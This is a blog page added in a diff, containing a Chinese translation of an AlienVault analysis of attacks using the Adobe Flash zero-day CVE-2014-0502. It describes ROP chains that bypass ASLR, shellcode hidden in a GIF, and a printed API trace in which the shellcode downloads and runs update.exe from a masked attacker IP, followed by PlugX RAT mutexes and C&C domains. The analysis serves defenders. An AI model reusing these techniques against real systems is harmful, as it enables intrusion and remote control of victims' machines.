@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>对利用Adobe 0day – CVE-2014-0502进行攻击的行为分析</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>对利用Adobe 0day – CVE-2014-0502进行攻击的行为分析</h2>
+	<p class="meta">2014-02-28</p>
+
+	<div class="post">
+	        <p></p>
+<p>前些天FireEye<a textvalue="发布了一个利用AdobeFlash的新0day进行攻击的报告" data_ue_src="http://www.fireeye.com/blog/technical/targeted-attack/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html" title="" target="_blank" href="http://www.fireeye.com/blog/technical/targeted-attack/2014/02/operation-greedywonk-multiple-economic-and-foreign-policy-sites-compromised-serving-up-flash-zero-day-exploit.html">发布了一个利用AdobeFlash的新0day进行攻击的报告</a>，且Adobe已经根据漏洞情况<a textvalue="发布了一个安全更新" data_ue_src="http://helpx.adobe.com/security/products/flash-player/apsb14-07.html" title="" target="_blank" href="http://helpx.adobe.com/security/products/flash-player/apsb14-07.html">发布了一个安全更新</a>。</p>
+<p>根据FireEye的报告，许多网站会将访问者重定向到以下包含exploit的恶意服务器：</p>
+<pre class="prettyprint lang-html">Peterson Institute for InternationalEconomics
+American Research Center in Egypt
+Smith Richardson Foundation</pre>
+<p>恶意Flash文件位于<span style="color: rgb(38, 38, 38);"><strong>http://4.59.XXX.XX/common/cc.swf</strong></span></p>
+<p>该Flash包含一些有趣的debug symbols：</p>
+<pre class="prettyprint lang-html">C:\Users07\Desktop\FlashExp(ie)\src\cc.as</pre>
+<p>Flash文件中的ActionScript代码用来确定操作系统版本以及选择硬编码的ROP chains来绕过ASLR。</p>
+<p style="text-align:center"><img data-original="/imgs/a154328a1660179998439d4de4fea828.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="1.png"></p>
+<noscript><img src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="1.png"></noscript>
+<p>如果是Windows XP系统，代码会先检查系统语言，对于以下两种语言的系统，则只包含ROP chains：</p>
+<pre class="prettyprint lang-html">英文
+中文</pre>
+<p>在这种情况下（Windows XP系统），ROP chain使用一种<a textvalue="众所周知的技术" data_ue_src="https://www.corelan.be/index.php/security/corelan-ropdb/" title="" target="_blank" href="https://www.corelan.be/index.php/security/corelan-ropdb/">众所周知的技术</a>从msvcrt.dll中提取编译。</p>
+<p style="text-align:center"><img data-original="/imgs/14c9fce6451bd0fdfcee90464a801ab2.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="2.png"></p>
+<noscript><img src="/imgs/14c9fce6451bd0fdfcee90464a801ab2.png!small" title="2.png"></noscript>
+<p>如果系统运行的是Windows 7：</p>
+<p> - 检查系统是否安装了Java 1.6或Java 1.7。</p>
+<p> - 如果安装了Java1.6，代码使用Java 1.6中自带的msvcr71.dll中的ROP chain，该dll文件没有ASLR保护。 </p>
+<p> - 检查系统是否安装了Microsoft Office 2007或2010</p>
+<p> - 如果安装了，则使用Microsoft Office 2007/2010中自带的hxdl.dll中的ROP chain，该dll没有ASLR保护。</p>
+<p>要加载hxds.dll，需要使用一种在这种类型的exploits中很常见的协议处理器location.href = 'ms-help:'</p>
+<p>ActionScript代码同时负责下载一个GIF文件：</p>
+<p style="text-align:center"><img data-original="/imgs/60418c9d9c323715bf34b43eb13ed39f.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="3.png"></p>
+<noscript><img src="/imgs/60418c9d9c323715bf34b43eb13ed39f.png!small" title="3.png"></noscript>
+<p>下载的文件如下图所示，看起来是个正常的图片：</p>
+<p style="text-align:center"><img data-original="/imgs/d570ce4a0c6e83094a53fd7657ab9115.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="4.png"></p>
+<noscript><img src="/imgs/d570ce4a0c6e83094a53fd7657ab9115.png!small" title="4.png"></noscript>
+<p>但该图片在位于偏移3344的地方包含一个shellcode，该shellcode会从同一服务器下载并执行一个PE32文件：</p>
+<p style="text-align:center"><img data-original="/imgs/5de762c737c3f57ae9cf7052ea1550a3.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="5.png"></p>
+<noscript><img src="/imgs/5de762c737c3f57ae9cf7052ea1550a3.png!small" title="5.png"></noscript>
+<p>利用图片执行shellcode是一个聪明的做法，因为这样可以绕过很多网络安全产品的监控。</p>
+<p>该shellcode通过利用以下函数来下载并执行PE32文件：</p>
+<pre class="prettyprint lang-html">    LoadLibraryA(wininet)
+    LoadLibraryA(user32)
+    VirtualProtect(adr=404bf1, sz=4,flags=40)
+    SetUnhandledExceptionFilter(0)
+    VirtualProtect(adr=7c81cdda, sz=82,flags=40)
+    VirtualProtect(adr=7c81cdda, sz=82,flags=0)
+    SetUnhandledExceptionFilter(7c81cdda)
+    GetTempPath(len=104, buf=12fca4) = 14
+   GetTempFileName(path=C:\users\jaime\Temp\, prefix=0, unique=0,buf=12fca4) = 245D
+     Path = C:\users\jaime\Temp\245d.tmp
+    InternetOpenA()
+   InternetOpenUrlA(http://4.59.XX.XX/common/update.exe)
+   CreateFileA(C:\users\jaime\Temp\245d.tmp) = 4
+    InternetReadFile(1, buf: 12fbe8, size:64)
+    InternetCloseHandle(1) = 1
+    InternetCloseHandle(1) = 1
+    CloseHandle(4)</pre>
+<p>本次攻击中所用的payload是一个不怎么出名的远控程序PlugX RAT，我之前的博客中提到过它几次：</p>
+<p><a textvalue="Tracking down the author of the PlugX RAT" data_ue_src="http://www.alienvault.com/open-threat-exchange/blog/tracking-down-the-author-of-the-plugx-rat" title="" target="_blank" href="http://www.alienvault.com/open-threat-exchange/blog/tracking-down-the-author-of-the-plugx-rat">Tracking down the author of the PlugX RAT</a> </p>
+<p><a textvalue="The connection between the Plugx Chinese gang and the latestInternet Explorer Zeroday" data_ue_src="http://www.alienvault.com/open-threat-exchange/blog/the-connection-between-the-plugx-chinese-gang-and-the-latest-internet-explo" title="" target="_blank" href="http://www.alienvault.com/open-threat-exchange/blog/the-connection-between-the-plugx-chinese-gang-and-the-latest-internet-explo">The connection between the Plugx Chinese gang and the latestInternet Explorer Zeroday</a></p>
+<p><a textvalue="New versions of the IExplorer ZeroDay emerge targeting Defence andIndustrial companies" data_ue_src="http://www.alienvault.com/open-threat-exchange/blog/new-versions-of-the-iexplorer-zeroday-emerge-targeting-defence-and-industri" title="" target="_blank" href="http://www.alienvault.com/open-threat-exchange/blog/new-versions-of-the-iexplorer-zeroday-emerge-targeting-defence-and-industri">New versions of the IExplorer ZeroDay emerge targeting Defence andIndustrial companies</a></p>
+<p>恶意程序会将它自己拷贝到\AllUsers\DRM\RasTls\RasTls.exe，并在执行过程中创建以下互斥文件：</p>
+<pre class="prettyprint lang-html">\BaseNamedObjects\Global\dklw
+\BaseNamedObjects\Global\cso
+\BaseNamedObjects\Global\qemyqvmyhiy
+\BaseNamedObjects\Global\eriwjjo
+\BaseNamedObjects\Global\etniisebehheq
+\BaseNamedObjects\Global\beetxado
+\BaseNamedObjects\Global\zhyzrjduosfptunf
+\BaseNamedObjects\Global\zzusnnzeqgzupeto
+\BaseNamedObjects\Global\onwmkwazrynpn
+\BaseNamedObjects\Global\nmtg
+\BaseNamedObjects\Global\helbibkzhruo
+\BaseNamedObjects\Global\opylrvflplgad
+\BaseNamedObjects\Global\zgjawrojchcfavnh
+\BaseNamedObjects\Global\gmd
+\BaseNamedObjects\Global\svdwr
+\BaseNamedObjects\Global\unbdehrrxgqujyazj
+\BaseNamedObjects\Global\qpl
+\BaseNamedObjects\Global\ihnwguwceofkhcv
+\BaseNamedObjects\Global\kvxieoc
+\BaseNamedObjects\My_Name_horse(Svchost)</pre>
+<p>同时将自身注入到svchost进程中。</p>
+<p>PlugX包含三种不同的命令和控制方式：</p>
+<pre class="prettyprint lang-html">00903474 -&gt; java[.]ns1[.]name
+009034B8 -&gt; adservice[.[no-ip[.]org
+009034FC -&gt; wmi[.]ns01[.]us</pre>
+<p>并通过HTTP与C&amp;C交互：</p>
+<p style="text-align:center"><img data-original="/imgs/231122931b9bcd378ec6a6a38d4e0d43.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="6.png"></p>
+<noscript><img src="/imgs/231122931b9bcd378ec6a6a38d4e0d43.png!small" title="6.png"></noscript>
+<p>注意下图中指定的C&amp;C域名是恶意构造的：</p>
+<p style="text-align:center"><img data-original="/imgs/9eed89130ea25947ddb9bda13f29fd43.png!small" src="/imgs/a154328a1660179998439d4de4fea828.png!small" title="7.png"></p>
+<noscript><img src="/imgs/9eed89130ea25947ddb9bda13f29fd43.png!small" title="7.png"></noscript>
+<p>至此，不用我提醒你也会尽快更新Adobe和包含漏洞、可以被用来绕过ASLR的Java和Office版本了吧。</p>
+<p>祝玩得愉快！</p>
+<p>[译自 <a title="" target="_blank" href="http://www.alienvault.com/open-threat-exchange/blog/analysis-of-an-attack-exploiting-the-adobe-zero-day-cve-2014-0502">alienvault</a>]</p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
